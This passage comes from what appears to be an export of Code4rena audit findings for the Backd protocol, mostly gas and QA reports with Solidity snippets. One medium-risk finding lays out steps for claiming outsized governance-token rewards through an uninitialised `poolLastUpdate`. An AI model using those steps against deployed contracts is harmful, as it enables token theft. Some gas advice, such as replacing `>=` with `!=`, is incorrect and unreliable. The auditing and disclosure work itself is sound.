```LpGauge.sol``` contracts would fail in a similar way in addition to any other gauges that call ```mintRewards```.  ## Recommended Mitigation Steps  Consider either returning a bool value for the ```mintRewards``` function in ```InflationManager.sol``` and check the return value in the gauges or insert the mint call in a require,   ```require(Minter(minter).mint(beneficiary, amount))```"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-backd-findings/issues/154", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-05-backd-findings", "body": "## [G-01] Unnecessary less than check `amount` is a UINT and therefore can not be less than 0. Change `<=` to `==`  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/LpGauge.sol#L59"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-backd-findings/issues/153", "labels": ["bug", "QA (Quality Assurance)", "resolved", "sponsor confirmed"], "target": "2022-05-backd-findings", "body": "## [L-01] Inconsistency in event emissions Events are emitted at the beginning vs end of the function execution. Temporary variables are/aren't used in the event emission call.  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/utils/Preparable.sol#L140-L154  ## [L-02] Code vs comment conflict: Backwards imp. of \u201csafe\u201d The \"safe\" function is not the safe version. The unsafe version is the one that reverts in unsuccessful.  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/AddressProvider.sol#L307-L327  ## [L-03] Use of deprecated SafeApprove() `SafeApprove()` has been deprecated according to OpenZeppelin.  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/FeeBurner.sol#L118  ## [L-04] Improper ownership transfer It is recommended to make ownership transfer a two-step process where you firstly set a pending owner address and then accept the pending owner in a second call.  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/VestedEscrow.sol#L68-L72  ## [L-05] Missing event emissions on important setter functions https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/AmmConvexGauge.sol#L86-L96  ## [L-06] Missing address(0) checks on important functions https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/BkdLocker.sol#L227-L232 https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/StakerVault.sol#L322 https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/StakerVault.sol#L381 https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/VestedEscrow.sol#L146 https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/AmmGauge.sol#L131  ## [N-01] Inconsistency in using modifier Sometimes modifier is used. Sometimes require statement is used.  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/KeeperGauge.sol#L57 https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/AmmGauge.sol#L50  ## [N-02] Typo in \"an\" https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/InflationManager.sol#L66"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-backd-findings/issues/151", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-05-backd-findings", "body": "  if just reading the constant it still costs gas .to make it less gas make it a smaller  bytes10 then bytes32 because  1 char =1 byte each byte less saves gas.    bytes32 internal constant _START_BOOST = \"startBoost\";    bytes32 internal constant _MAX_BOOST = \"maxBoost\";    bytes32 internal constant _INCREASE_PERIOD = \"increasePeriod\";    bytes32 internal constant _WITHDRAW_DELAY = \"withdrawDelay\"; https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/BkdLocker.sol#L21-L24 https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/Controller.sol#L25   https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/InflationManager.sol#L25-L28   Use Custom Errors instead of Revert Strings to save Gas Custom errors from Solidity 0.8.4 are cheaper than revert strings (cheaper deployment cost and runtime cost when the revert condition is met) Source Custom Errors in Solidity: Starting from Solidity v0.8.4, there is a convenient and gas-efficient way to explain to users why an operation failed through the use of custom errors. Until now, you could already use strings to give more information about failures (e.g., revert(\"Insufficient funds.\");), but they are rather expensive, especially when it comes to deploy cost, and it is difficult to use dynamic information in them. Custom errors are defined using the error statement, which can be used inside and outside of contracts (including interfaces and libraries). ROLEmanager.sol 28:        require(hasRole(Roles.GOVERNANCE, msg.sender), Error.UNAUTHORIZED_ACCESS); 46:        require(getRoleMemberCount(Roles.GOVERNANCE) > 1, Error.CANNOT_REVOKE_ROLE); 112:        require(role != Roles.GOVERNANCE, Error.CANNOT_REVOKE_ROLE); 113:        require(hasRole(role, account), Error.INVALID_ARGUMENT); https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/AmmGauge.sol#L104 https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/AmmGauge.sol#L125 https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/KeeperGauge.sol#L140 https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/Minter.sol#L152  \u2014----------------------------------------------  In a require statement it saves gas to make !=0 .Uint variable is anything greater or equal to zero it saves gas to make != 0   https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/BkdLocker.sol#L91-L94 https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/AmmGauge.sol#L104 https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/KeeperGauge.sol#L140   ++i costs less gas compared to i++ or i += 1 ++i costs less gas compared to i++ or i += 1 for unsigned integer, as pre-increment is cheaper (about 5 gas per iteration). This statement is true even with the optimizer enabled. i++ increments i and returns the initial value of i. Which means: uint i = 1; i++; // == 1 but i == 2 But ++i returns the actual incremented value: uint i = 1; ++i; // == 2 and i == 2 too, so no need for a temporary variable In the first case, the compiler has to create a temporary variable (when used) for returning 1 instead of 2   epoch++  Change to  ++epoch  https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/KeeperGauge.sol#L59  Same thing with minus  - -  Use  \u2013 i instead of putting multiple assignment to i  i = i - 1; https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/BkdLocker.sol#L140  Uint48 after a bool and bool fills the slot of zeros so uint 48 is waste of gas and it will be cheaper to use uint and uint48 like a mix to make it one slot or after the address because address is 160 bits. If you want the bool then make uint48  into uint256 to save gas. https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/AmmGauge.sol#L32 Order: Address -one slot  Bool -one slot Uint48-one slot  New Order: Address -160  Uint48-48 1 slot with 48 remaining  Bool -1slot  Saving:20_000 gas  \u2014------------------------------------------ Make variable uninitialized to save gas for sstore 20_000 and memory 3 gas  Because by default its already zero  https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/AmmGauge.sol#L64 \u2014------------------------------------ Reduce the size of error messages (Long revert Strings) Shortening revert strings to fit in 32 bytes will decrease deployment time gas and will decrease runtime gas when the revert condition is met. Revert strings that are longer than 32 bytes require at least one additional mstore, along with additional overhead for computing memory offset, etc.   1 byte for each  character   https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/Minter.sol#L152 In the EVM, there is no opcode for >= or <=. When using greater than or equal, two operations are performed: > and =. Using strict comparison operators hence saves gas require(delay >= _MIN_DELAY, Error.DELAY_TOO_SHORT);  Instead use  Delay != _MIN_DELAY  https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/utils/Preparable.sol#L29 \u2014------------------------------- Events with 3 fields make indexed to save gas https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/interfaces/vendor/ICvxLocker.sol#L51-L53  Dead code it wastes gas in the code  storing type  It will never call the approve function  https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/RewardHandler.sol#L63 "}, {"title": "Inconsistency in view functions can lead to users believing they\u2019re due for more BKD rewards", "html_url": "https://github.com/code-423n4/2022-05-backd-findings/issues/150", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-05-backd-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/AmmConvexGauge.sol#L107-L111 https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/AmmConvexGauge.sol#L129-L134   # Vulnerability details  ## Impact The view functions used for a user to check their claimable rewards vary in their implementation. This can cause users to believe they are due X amount but will receive Y.  ## Proof of Concept If the `inflationRecipient` is set, then `poolStakedIntegral` will be incremented in `claimableRewards()` but not in any other function like `allClaimableRewards()` or `poolCheckpoint()`.  If a user calls `claimableRewards()` after the `inflationRepient` has been set, `claimableRewards()` will return a larger value than `allClaimableRewards()` or the amount actually returned by `claimRewards()`.  ## Tools Used Manual review  ## Recommended Mitigation Steps To make the logic consistent, `claimableRewards()` needs `if (inflationRecipient == address(0))` added to it.  "}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-backd-findings/issues/149", "labels": ["bug", "QA (Quality Assurance)", "resolved", "sponsor confirmed"], "target": "2022-05-backd-findings", "body": "No check on address zero can cause logic errors and lost of funds  https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/InflationManager.sol#L221 https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/InflationManager.sol#L221 https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/zaps/PoolMigrationZap.sol#L52   Add more comments on burnFees function and natspec comments  https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/RewardHandler.sol#L35   Very hard to read code and  its very packed together.its so compacted that my vscode visual extension cant read if its state or memory variable  https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/RewardHandler.sol#L36-L48 \u2014-------------------------------------- if (IERC20(token).allowance(address(this), spender) > 0) return;        IERC20(token).safeApprove(spender, type(uint256).max); Just space it out to make it more readable  https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/RewardHandler.sol#L63  https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/zaps/PoolMigrationZap.sol#L52-L66  if allowance is more then zero then  it will return nothing and first return something to  help  a function that calls this function  if this allowance is more than zero it will return nothing and it you cant approve anything  its dead code "}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-backd-findings/issues/148", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-05-backd-findings", "body": "## G01 - Comparison ```> 0``` is less gas efficient than ```!= 0``` with ```uint256``` in ```require``` statement with optimizer  ```solidity protocol/contracts/BkdLocker.sol:91 require(amount > 0, Error.INVALID_AMOUNT); protocol/contracts/BkdLocker.sol:92 require(totalLockedBoosted > 0, Error.NOT_ENOUGH_FUNDS);  protocol/contracts/BkdLocker.sol:137    require(length > 0, \"No entries\"); protocol/contracts/tokenomics/AmmGauge.sol:104  require(amount > 0, Error.INVALID_AMOUNT);  protocol/contracts/tokenomics/AmmGauge.sol:125  require(amount > 0, Error.INVALID_AMOUNT);  protocol/contracts/tokenomics/KeeperGauge.sol:140   require(totalClaimable > 0, Error.ZERO_TRANSFER_NOT_ALLOWED); protocol/contracts/tokenomics/VestedEscrow.sol:84   require(unallocatedSupply > 0, \"No reward tokens in contract\");  ```  ## G02 - Too long revert string  Shortening revert strings to fit in 32 bytes will decrease deployment time gas and will decrease runtime gas when the revert condition has been met.  ```solidity protocol/contracts/tokenomics/Minter.sol:152    \"Maximum non-inflation amount exceeded.\"  ``` https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/Minter.sol#L152  ## G03 - ```unchecked``` block can be used for gas efficiency of the expression that can't overflow/underflow  Check comments ```soldity  protocol/contracts/utils/CvxMintAmount.sol:21   uint256 currentCliff = cvxTotalSupply / _CLIFF_SIZE; // Could be unchecked since _CLIFF_SIZE is non-zero constant  protocol/contracts/zaps/PoolMigrationZap.sol:22 for (uint256 i; i < newPools_.length; ++i) { // Increment in for loop can be unchecked, it would never overflow with type uint256 protocol/contracts/tokenomics/VestedEscrow.sol:155  uint256 elapsed = _time - startTime; // Could be unchecked due to check on L152 protocol/contracts/BkdLocker.sol:140    i = i - 1; // Could be unchecked due to check on L139 protocol/contracts/BkdLocker.sol:144    stashedWithdraws[i] = stashedWithdraws[stashedWithdraws.length - 1]; //  Could be unchecked since length of stashedWithdraws decrease in sync with counter \"i\" and loop will end after length 1 ```  ## G04 - Caching storage values in memory  Variables that are read multiple times in a code block can be cached and re-used instead of reading from storage to save gas.  ```solidity protocol/contracts/StakerVault.sol:338  uint256 staked = IERC20(token).balanceOf(address(this)) - oldBal; // token 5 SLOADs ``` https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/StakerVault.sol#L322-L349 ```solidity protocol/contracts/StakerVault.sol:383  uint256 unstaked = oldBal.uncheckedSub(IERC20(token).balanceOf(address(this))); // token 4 SLOADs ``` https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/StakerVault.sol#L359-L398  ## G05 - Redundant code  The following lines don't change the value of the variable since it's uint256: ```solidity protocol/contracts/tokenomics/InflationManager.sol:575  totalKeeperPoolWeight = totalKeeperPoolWeight > 0 ? totalKeeperPoolWeight : 0;  protocol/contracts/tokenomics/InflationManager.sol:589  totalLpPoolWeight = totalLpPoolWeight > 0 ? totalLpPoolWeight : 0;  protocol/contracts/tokenomics/InflationManager.sol:602  totalAmmTokenWeight = totalAmmTokenWeight > 0 ? totalAmmTokenWeight : 0; ``` https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/InflationManager.sol#L575 "}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-backd-findings/issues/146", "labels": ["bug", "QA (Quality Assurance)", "resolved", "sponsor confirmed"], "target": "2022-05-backd-findings", "body": " ## N01 - Typos  ``` protocol/contracts/BkdLocker.sol:173   * @dev This does not invlude the gov. tokens queued for withdrawal. // typo - include protocol/contracts/tokenomics/FeeBurner.sol:29  event Burned(address targetLpToken, uint256 amountBurned); // Emmited after a successfull burn to target lp token //  typo - successful protocol/contracts/tokenomics/FeeBurner.sol:84  // Transfering LP tokens back to sender // typo -Transferring ```  ## N02 - Open TODO  ```solidity protocol/contracts/tokenomics/InflationManager.sol:532  //TOOD: See if this is still needed somewhere ```  ## N03 - More readable numbers  Numbers like 100000000 could be set 100_000_000 for more readability:  ```solidity     uint256 private constant _CLIFF_SIZE = 100000 * 1e18; //new cliff every 100,000 tokens      uint256 private constant _CLIFF_COUNT = 1000; // 1,000 cliffs     uint256 private constant _MAX_SUPPLY = 100000000 * 1e18; //100 mil max supply      ``` "}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-backd-findings/issues/142", "labels": ["bug", "QA (Quality Assurance)", "resolved", "sponsor confirmed"], "target": "2022-05-backd-findings", "body": "### FINDINGS ### TYPOS  File: BkdLocker.sol [line 732](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/BkdLocker.sol#L173) ``` * @dev This does not invlude the gov. tokens queued for withdrawal. ``` **invlude** Instead of **include**  File: FeeBurner.sol [line 35](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/FeeBurner.sol#L35) ``` receive() external payable {} // Recieve function for withdrawing from Backd ETH Pool ``` **Recieve** instead of **Receive**  File:AddressProvider.sol  [line 237](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/AddressProvider.sol#L237) ```  * @param key Key to feeze   ``` **feeze** Instead of **freeze**   ### NATSPEC is Incomplete  File: AddressProvider.sol [line 77-87 ](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/AddressProvider.sol#L77-L87) ```    /**      * @notice Adds action.      * @param action Address of action to add.      */     function addAction(address action) external override onlyGovernance returns (bool) {         bool result = _actions.add(action);         if (result) {             emit ActionListed(action);         }         return result;     } ``` Missing @return    File:AddressProvider.sol [line 172-178](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/AddressProvider.sol#L172-L178) ```     /**      * @notice Returns the address for the given key      */     function getAddress(bytes32 key) public view override returns (address) {         require(_addressKeyMetas.contains(key), Error.ADDRESS_DOES_NOT_EXIST);         return currentAddresses[key];     } ``` Missing @param key   File:AddressProvider.sol [line 180-187](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/AddressProvider.sol#L180-L187) ```     /**      * @notice Returns the address for the given key      * @dev if `checkExists` is true, it will fail if the key does not exist      */     function getAddress(bytes32 key, bool checkExists) public view override returns (address) {         require(!checkExists || _addressKeyMetas.contains(key), Error.ADDRESS_DOES_NOT_EXIST);         return currentAddresses[key];     } ``` Missing @param key   File:AddressProvider.sol  [line 264-268](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/AddressProvider.sol#L264-L268) ```    /**      * @notice Execute update of `key`      * @return New address.      */     function executeAddress(bytes32 key) external override returns (address) { ``` Missing @param key   File:AddressProvider.sol [line 365-369](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/AddressProvider.sol#L365-L369) ```    /**      * @notice returns the pool at the given index      */     function getPoolAtIndex(uint256 index) external view override returns (address) {         return _tokenToPools.valueAt(index); ``` Missing @param index   File: StakerVault.sol [line 93-98](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/StakerVault.sol#L93-L98) ```    /**      * @notice Registers an address as a strategy to be excluded from token accumulation.      * @dev This should be used if a strategy deposits into a stakerVault and should not get gov. tokens.      * @return `true` if success.      */     function addStrategy(address strategy) external override returns (bool) { ``` Missing @param strategy    ### Inconsistent use/impementation of the uncheck block   Throught the contracts  a library is being used to handle the arithmetic operations that can never over/underflow. The library **UncheckedMath.sol** has been used in all for loops to wrap the the loop increment  using the function **uncheckedInc()** as shown below  File: StakerVault.sol [line 256-263](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/StakerVault.sol#L256-L263) ```     function getStakedByActions() external view override returns (uint256) {         address[] memory actions = addressProvider.allActions();         uint256 total;         for (uint256 i; i < actions.length; i = i.uncheckedInc()) {             total += balances[actions[i]];         }         return total;     } ```  The above usage of the library **UncheckedMath.sol** and the **uncheckedInc()** function has been implemented in all contracts apart from the following.   File:PoolMigrationZap.sol  [line 38-45](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/zaps/PoolMigrationZap.sol#L38-L45) ```    function migrateAll(address[] calldata oldPoolAddresses_) external override {         for (uint256 i; i < oldPoolAddresses_.length; ) {             migrate(oldPoolAddresses_[i]);             unchecked {                 ++i;             }         }     } ```  The above uses the unchecked{} block directly rather than follow the same pattern with other contracts.  I would suggest we stick to the same approach in handling the arithmetics that can never over/underflow."}, {"title": "Users can claim extremely large rewards or lock rewards from LpGauge due to uninitialised `poolLastUpdate` variable", "html_url": "https://github.com/code-423n4/2022-05-backd-findings/issues/141", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-05-backd-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/LpGauge.sol#L115-L119 https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/StakerVault.sol#L326-L328   # Vulnerability details  ## Impact A user can claim all of the available governance tokens or prevent any rewards from being claimed in `LpGauge.sol` if sufficient time is left between deploying the contract and initialising it in the `StakerVault.sol` contract by calling `initalizeLPGauge()` OR if a new `LPGauge` contract is deployed and added to `StakerVault` using `prepareLPGauge`.  Inside `LPGauge.sol` when calling `_poolCheckPoint()`, the `lastUpdated` variable is not initalised so defaults to a value of `0`, therefore if the user has managed to stake tokens in the `StakerVault` then the calculated `poolStakedIntegral` will be very large (as block.timestamp is very large). Therefore a user can mint most current available governance tokens for themselves when they claim their rewards (or prevent any governance tokens from being claimed).  ## Proof of Concept 1. LP Gauge and StakerVault contracts are deployed 2. Before the `initializeLpGauge()`, user A will stake 1 token with `stakeFor()` thereby increasing `_poolTotalStaked` by 1. As the `lpgauge` address is equal to the zero address, `_userCheckPoint()` will not be called and `poolLastUpdate` will remain at 0. 3. The user can then directly call `_userCheckPoint()` and be allocated a very large number of shares. This works because `poolLastUpdate` is 0 but the staked amount in the vault is larger than 0 4. Once `initializeLPGauge()` is called, the user can then call `claimRewards()` and receive a very large portion of tokens or if `poolStakedIntegral` exceeds the mint limit set by `Minter.sol` then no one else can claim governance tokens from the lpGauge.  OR 5. A new LP Gauge contract is deployed and added to the vault using `prepareGauge()`. Follow steps 2 to 4.  ## Tools Used Manual audit ## Recommended Mitigation Steps Initialise `poolLastUpdate` in the constructor  "}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-backd-findings/issues/140", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-05-backd-findings", "body": "## FINDINGS  ## Comparisons: != is more efficient than > in require  != 0 costs less gas compared to > 0 for unsigned integers in require statements with the optimizer enabled (6 gas)  Proof: While it may seem that > 0 is cheaper than !=, this is only true without the optimizer enabled and outside a require statement. If you enable the optimizer at 10k AND you're in a require statement, this will save gas. You can see this [tweet](https://twitter.com/gzeon/status/1485428085885640706) for more proofs:   I suggest changing > 0 with != 0 here:  File: BkdLocker.sol [line 91](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/BkdLocker.sol#L91) ``` require(amount > 0, Error.INVALID_AMOUNT); ``` Since **amount** is a uint256, it means it's value can never be less than 0 so the test > 0 is essentially testing that amount is not equal to 0 a  **Other Instances** File: BkdLocker.sol [line 92](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/BkdLocker.sol#L92) ``` require(totalLockedBoosted > 0, Error.NOT_ENOUGH_FUNDS); ```   File: BkdLocker.sol [line 137](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/BkdLocker.sol#L137) ``` require(length > 0, \"No entries\"); ```  File: VestedEscrow.sol [line 84](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/VestedEscrow.sol#L84) ``` require(unallocatedSupply > 0, \"No reward tokens in contract\"); ``` File: AmmGauge.sol [line 104](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/AmmGauge.sol#L104) ``` require(amount > 0, Error.INVALID_AMOUNT); ``` File: AmmGauge.sol [line 125](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/AmmGauge.sol#L125) ```         require(amount > 0, Error.INVALID_AMOUNT); ```  ## use shorter revert strings(less than 32 bytes) or use custom errors  File: Minter.sol [line 150](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/Minter.sol#L150)  ```require(             issuedNonInflationSupply + amount <= nonInflationDistribution,             \"Maximum non-inflation amount exceeded.\"         ); ```  ## Cache the length of arrays in loops Reading array length at each iteration of the loop takes 6 gas (3 for mload and 3 to place memory_offset) in the stack. Caching the array length in the stack saves around 3 gas per iteration. Therefore, it\u2019s possible to save a significant amount of gas  especially when the length is significantly big.  Here, I suggest storing the array\u2019s length in a variable before the for-loop, and use it instead:   File:StakerVault.sol [line 259](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/StakerVault.sol#L259)   ``` function getStakedByActions() external view override returns (uint256) {         address[] memory actions = addressProvider.allActions();         uint256 total;         for (uint256 i; i < actions.length; i = i.uncheckedInc()) {             total += balances[actions[i]];         }         return total;     } ``` The line to modify:  ``` for (uint256 i; i < actions.length; i = i.uncheckedInc()) { ```   **Other Instance to change** File: RewardHandler.sol [line 35-55](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/RewardHandler.sol#L35-L55)  ```    function burnFees() external override {         IBkdLocker bkdLocker = IBkdLocker(addressProvider.getBKDLocker());         IFeeBurner feeBurner = addressProvider.getFeeBurner();         address targetLpToken = bkdLocker.rewardToken();         address[] memory pools = addressProvider.allPools();         uint256 ethBalance = address(this).balance;         address[] memory tokens = new address[](pools.length);         for (uint256 i; i < pools.length; i = i.uncheckedInc()) {             ILiquidityPool pool = ILiquidityPool(pools[i]);             address underlying = pool.getUnderlying();             if (underlying != address(0)) {                 _approve(underlying, address(feeBurner));             }             tokens[i] = underlying;         }         feeBurner.burnToTarget{value: ethBalance}(tokens, targetLpToken);         uint256 burnedAmount = IERC20(targetLpToken).balanceOf(address(this));         IERC20(targetLpToken).safeApprove(address(bkdLocker), burnedAmount);         bkdLocker.depositFees(burnedAmount);         emit Burned(targetLpToken, burnedAmount);     } ``` The specific line to change [here](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/RewardHandler.sol#L42) ```        for (uint256 i; i < pools.length; i = i.uncheckedInc()) { ```   File: PoolMigrationZap.sol [line 22](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/zaps/PoolMigrationZap.sol#L22) ```         for (uint256 i; i < newPools_.length; ++i) { ```   Something similar to my propasal **was implemented on this contract as shown in the function below.** File:Controller.sol [line 121-130](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/Controller.sol#L121-L130) ```    function getTotalEthRequiredForGas(address payer) external view override returns (uint256) {         // solhint-disable-previous-line ordering         uint256 totalEthRequired;         address[] memory actions = addressProvider.allActions();         uint256 numActions = actions.length;         for (uint256 i; i < numActions; i = i.uncheckedInc()) {             totalEthRequired += IAction(actions[i]).getEthRequiredForGas(payer);         }         return totalEthRequired;     } ``` Note the array length was cached to **numActions**   **Also Implemented on here:** File:InflationManager.sol [line 96-100](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/InflationManager.sol#L96-L100) ```address[] memory liquidityPools = addressProvider.allPools();         uint256 length = liquidityPools.length;         for (uint256 i; i < length; i = i.uncheckedInc()) {             _removeKeeperGauge(address(liquidityPools[i]));         } ```  ### Using unchecked blocks to save gas Solidity version 0.8+ comes with implicit overflow and underflow checks on unsigned integers. When an overflow or an underflow isn't possible (as an example, when a comparison is made before the arithmetic operation), some gas can be saved by using an unchecked block: [see official docs](https://docs.soliditylang.org/en/v0.8.10/control-structures.html#checked-or-unchecked-arithmetic)  File: VestedEscrow.sol [line 63](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/VestedEscrow.sol#L63) ```         totalTime = endtime_ - starttime_; ``` The above line cannot overflow due to the check on the line shown below File: VestedEscrow.sol [line 58](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/VestedEscrow.sol#L58) ```         require(endtime_ > starttime_, \"end must be greater\"); ``` In this contract we have a library that can aid in having unchecked arithmetics that is **libraries/UncheckedMath.sol** imported on  [line 21](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/VestedEscrow.sol#L21)  With the help of this library we can modify our arithmetic to   ```         totalTime = 